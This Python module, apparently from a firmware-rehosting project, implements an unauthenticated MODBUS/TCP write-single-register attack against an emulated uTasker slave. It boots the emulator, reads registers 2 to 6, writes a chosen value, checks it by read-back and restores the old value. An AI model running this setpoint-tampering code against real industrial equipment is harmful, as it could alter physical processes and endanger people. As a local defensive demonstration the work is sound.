# Copyright 2026 Christopher Wright
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Unauthenticated MODBUS/TCP write against the uTasker slave's register map.

WHAT THIS DRIVES (the real seam, cited).  The rehosted firmware is a **MODBUS/TCP
slave on port 502** (the port is `f6 01` inside `cMODBUS_default` at flash
0x08015540) reached over its own network stack. Its request path is
``fnMODBUSListener`` (0x08012738) -> ``fnHandleMODBUS_input`` (0x08011b60) ->
``fnSendMODBUS_response`` (0x0801262a). Probing it with ``modbus.Session``
recovered the slave's holding-register map: **registers 2..6 exist**; 0, 1 and >=7
answer exception 0x02 (ILLEGAL DATA ADDRESS).

**The vulnerability.**  MODBUS/TCP has no authentication, no authorisation and no
integrity protection — it is the defining weakness of the protocol as deployed.
Anything that can reach :502 can issue a **function code 6 (write single
register)** against this slave's live register map. The firmware does not ask who
is calling, does not distinguish an engineering workstation from an attacker, and
keeps no record that the value was written rather than measured.

**The attack.**  Open a session and write a chosen value into a live holding
register, then read it back through the same session. This is the same class of
unauthenticated-write as the classic ICS setpoint-tampering case: the value the
slave subsequently serves to every other master is the attacker's.

**BEFORE / AFTER.**  ``ModbusWriteAttack.arm()`` reads the register, writes the
payload, and reads it back — all three through the firmware's own MODBUS engine.
The honest boolean is ``landed``: the registers here are **live** (their low bits
track device state and drift between reads), so ``landed`` requires the read-back's
**high byte** to equal the high byte written, which a drifting low nibble cannot
fake. The raw before/after/read-back values are all reported so the check is
auditable rather than trusted.

SCOPE / ETHICS.  This drives a rehosted, publicly-published demo firmware inside an
emulator on the operator's own machine. It is a defensive demonstration of why
MODBUS/TCP needs a segmented network and an authenticating gateway in front of it,
not a technique for interfering with deployed equipment.

Usage:
    python -m rehostry_utasker_modbus.attack     # scripted demo, JSON to stdout
    rehostry-utasker-modbus attack               # same, via the CLI
"""
from __future__ import annotations

import json
import os
import shutil
import signal
import subprocess
import time
from typing import Any, Callable, Dict, Optional

from . import modbus, paths, spawn

# The slave's live holding registers, as probed (0/1 and >=7 are out of range).
VALID_REGISTERS = (2, 3, 4, 5, 6)
TARGET_REGISTER = 2
ATTACK_VALUE = 0x1234


class ModbusWriteAttack:
    """Unauthenticated FC06 write into the slave's holding-register map."""

    def __init__(self, sport: int = 50400) -> None:
        self.sport = sport
        self.session: Optional[modbus.Session] = None

    # ---- session ------------------------------------------------------
    def connect(self) -> bool:
        s = modbus.Session(sport=self.sport)
        if not s.resolve() or not s.connect():
            return False
        self.session = s
        return True

    def read_map(self) -> dict:
        """The slave's register map as it serves it right now."""
        out = {}
        if self.session is None:
            return out
        for a in VALID_REGISTERS:
            r = self.session.read_holding(a, 1)
            out[a] = modbus.reg_value(r)
        return out

    # ---- the attack ---------------------------------------------------
    def arm(self, reg: int = TARGET_REGISTER, value: int = ATTACK_VALUE) -> dict:
        """Write `value` into `reg` with no credentials, and verify by read-back."""
        if self.session is None and not self.connect():
            return {"reg": reg, "value": value, "landed": False,
                    "note": "could not open a MODBUS session to the firmware "
                            "(is the rehost running with the eth bridge?)"}
        s = self.session
        before = modbus.reg_value(s.read_holding(reg, 1))
        ack = s.write_single(reg, value)
        wrote = bool(ack and not (ack[0] & 0x80))
        after = modbus.reg_value(s.read_holding(reg, 1))
        # These registers are live: the low bits drift between reads, so compare
        # the high byte, which device state does not move.
        landed = (wrote and after is not None
                  and (after >> 8) == ((value >> 8) & 0xFF))
        return {
            "reg": reg,
            "value": value,
            "value_hex": "0x%04x" % value,
            "before": before,
            "write_acknowledged": wrote,
            "after": after,
            "after_hex": None if after is None else "0x%04x" % after,
            "authentication_required": False,
            # REAL iff the slave now serves the attacker's value
            "landed": landed,
        }

    def restore(self, reg: int, value: Optional[int]) -> dict:
        """Put back a previously-read value (best effort; the low bits are live)."""
        if self.session is None or value is None:
            return {"restored": False}
        ack = self.session.write_single(reg, value)
        return {"restored": bool(ack and not (ack[0] & 0x80)),
                "value": value,
                "after": modbus.reg_value(self.session.read_holding(reg, 1))}


def run_modbus_write_demo(on_stage: Optional[Callable] = None,
                          reg: int = TARGET_REGISTER,
                          value: int = ATTACK_VALUE) -> dict:
    """Scripted seam: open a session, show the register map, write a register
    without credentials, verify by read-back, then put the old value back.
    Requires a separately-running rehost with the eth bridge (boot it via
    ``rehostry-utasker-modbus-panel`` or spawn.py's
    ``spawn_argv(overlays=[paths.ETH_BRIDGE_OVERLAY])``). ``run_attack`` below
    self-boots the same recipe."""
    def stage(name, **d):
        if on_stage:
            on_stage(name, **d)

    atk = ModbusWriteAttack()
    if not atk.connect():
        stage("error", note="no MODBUS session -- is the rehost running?")
        return {"error": True}
    stage("connect", note="MODBUS/TCP session up to %s:%d (no credentials were "
                          "offered or requested)" % (modbus.FW_IP, modbus.MODBUS_PORT))

    before_map = atk.read_map()
    stage("read", result=before_map,
          note="holding registers %s = %s" % (list(VALID_REGISTERS),
                                              list(before_map.values())))

    res = atk.arm(reg, value)
    stage("attack", result=res,
          note="FC06 wrote 0x%04x to register %d -> read-back %s; landed=%s"
               % (value, reg, res.get("after_hex"), res.get("landed")))

    rest = atk.restore(reg, before_map.get(reg))
    stage("restore", result=rest, note="wrote the previous value back")
    return {"map": before_map, "attack": res, "restore": rest}


# ---------------------------------------------------------------------------
# Self-booting entry point (fleet attack-interface contract, playbook §2a).
#
# `run_attack` spawns its OWN rehost (the same recipe the panel uses:
# spawn.py + the eth_bridge overlay), waits for the firmware's MODBUS listener to
# come up on its own network stack, runs the unauthenticated FC06 write, verifies
# by read-back through the firmware's own MODBUS engine, and tears down ONLY the
# PID it started. The oracle is unchanged -- `landed` still comes from
# `ModbusWriteAttack.arm()` (the read-back's high byte must equal the byte
# written, which the live low nibble cannot fake).
# ---------------------------------------------------------------------------

# The firmware needs its ARP/ETH bring-up to finish before the first connect
# (see utasker_panel.modbus_connect); connecting the instant the listener answers
# yields a fragile session. Overridable for a slow host.
WARMUP_S = float(os.environ.get("UTASKER_WARMUP_S", "25"))
# How long to keep retrying the MODBUS handshake after the warm-up.
CONNECT_DEADLINE_S = float(os.environ.get("UTASKER_CONNECT_DEADLINE_S", "150"))


def _clear_spool() -> None:
    """Start each self-booted run from a clean bridge spool so a stale frame from
    a previous run is never replayed into this firmware."""
    shutil.rmtree(modbus.SPOOL, ignore_errors=True)


def _shutdown(proc: Optional[subprocess.Popen], logf) -> None:
    """Tear down ONLY the rehost we spawned (its own process group). Never a
    global pkill -- other sessions run emulators on this machine (playbook §2.10)."""
    if proc is not None and proc.poll() is None:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except (ProcessLookupError, OSError):
            pass
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except (ProcessLookupError, OSError):
                pass
    if logf is not None:
        try:
            logf.close()
        except OSError:
            pass


def _wait_for_session(proc: subprocess.Popen, sport: int
                      ) -> Optional[ModbusWriteAttack]:
    """Wait for the firmware's own MODBUS/TCP listener, then hold one session.

    Mirrors utasker_panel.modbus_connect: let the stack settle (WARMUP_S), then
    retry the ARP+SYN handshake until the slave answers or the deadline passes.
    One ModbusWriteAttack object is reused across retries (each .connect() opens a
    fresh TCP session), matching the proven panel behaviour."""
    time.sleep(WARMUP_S)
    atk = ModbusWriteAttack(sport=sport)
    deadline = time.time() + CONNECT_DEADLINE_S
    while time.time() < deadline:
        if proc.poll() is not None:
            return None                       # emulator died -- stop waiting
        modbus.drain_inbox()                  # bridge replays queued frames; drop stale
        if atk.connect():
            return atk
        time.sleep(2.0)
    return None


def run_attack(on_stage: Optional[Callable] = None,
               log_dir: Optional[str] = None,
               reg: int = TARGET_REGISTER,
               value: int = ATTACK_VALUE,
               emulator: str = "unicorn") -> Dict[str, Any]:
    """Boot the uTasker MODBUS slave, run the unauthenticated FC06 write, and
    verify from the firmware's OWN output. Self-booting: spawns its own rehost and
    tears it down. Returns a dict with at least {"booted", "landed"}."""
    def stage(name: str, **d: Any) -> None:
        if on_stage:
            on_stage(name, **d)

    result: Dict[str, Any] = {"booted": False, "landed": False}

    if not paths.firmware_present():
        stage("error", note="firmware not extracted at %s -- run "
                            "tools/extract_firmware.py first (see PROVENANCE.md)"
                            % paths.firmware_bin())
        return result

    ld = log_dir or os.environ.get("TMPDIR", "/tmp")
    os.makedirs(ld, exist_ok=True)
    log_path = os.path.join(ld, "utasker_modbus_attack.log")

    _clear_spool()
    proc: Optional[subprocess.Popen] = None
    logf = None
    sport = 50400
    try:
        argv = spawn.spawn_argv(emulator=emulator,
                                overlays=[paths.ETH_BRIDGE_OVERLAY])
        env = spawn.spawn_env(extra={"HAL_ION_QUIET": "1"})
        logf = open(log_path, "w")
        stage("boot",
              note="booting uTasker MODBUS/TCP slave (STM32F4, ARMv7E-M) + eth "
                   "bridge; ~%ds to the MODBUS listener" % int(WARMUP_S),
              log=log_path)
        proc = subprocess.Popen(argv, cwd=spawn.spawn_cwd(), env=env,
                                stdin=subprocess.DEVNULL, stdout=logf,
                                stderr=subprocess.STDOUT, preexec_fn=os.setsid)

        atk = _wait_for_session(proc, sport)
        if atk is None:
            stage("error",
                  note="firmware never answered its MODBUS/TCP listener (see %s)"
                       % log_path)
            return result
        result["booted"] = True
        stage("connect",
              note="MODBUS/TCP session up to %s:%d -- no credentials were offered "
                   "or requested" % (modbus.FW_IP, modbus.MODBUS_PORT))

        # Baseline: the slave's live register map as it serves it right now. Read
        # in one burst (the firmware's session does not survive idle gaps).
        before_map = atk.read_map()
        stage("read", result=before_map,
              note="holding registers %s = %s" % (list(VALID_REGISTERS),
                                                  list(before_map.values())))

        # The attack + oracle (UNCHANGED): FC06 write, then read-back through the
        # firmware's own MODBUS engine; landed iff the high byte survived.
        res = atk.arm(reg, value)
        result["attack"] = res
        result["landed"] = bool(res.get("landed"))
        stage("attack", result=res,
              note="FC06 wrote 0x%04x to register %d -> read-back %s; landed=%s"
                   % (value, reg, res.get("after_hex"), res.get("landed")))

        # Best-effort restore (low bits are live, so this is not guaranteed exact).
        rest = atk.restore(reg, before_map.get(reg))
        result["restore"] = rest
        stage("restore", result=rest, note="wrote the previous value back")
        return result
    finally:
        _shutdown(proc, logf)
        stage("shutdown", note="rehost stopped")


def main() -> int:
    def show(name: str, **d: Any) -> None:
        note = d.pop("note", "")
        print("[stage] %s: %s" % (name, note))
        for key, val in d.items():
            print("         %s=%s" % (key, val))

    res = run_attack(on_stage=show)
    print("RESULT:", json.dumps({k: v for k, v in res.items()
                                 if k in ("booted", "landed")}))
    return 0 if res.get("landed") else 1


if __name__ == "__main__":
    raise SystemExit(main())
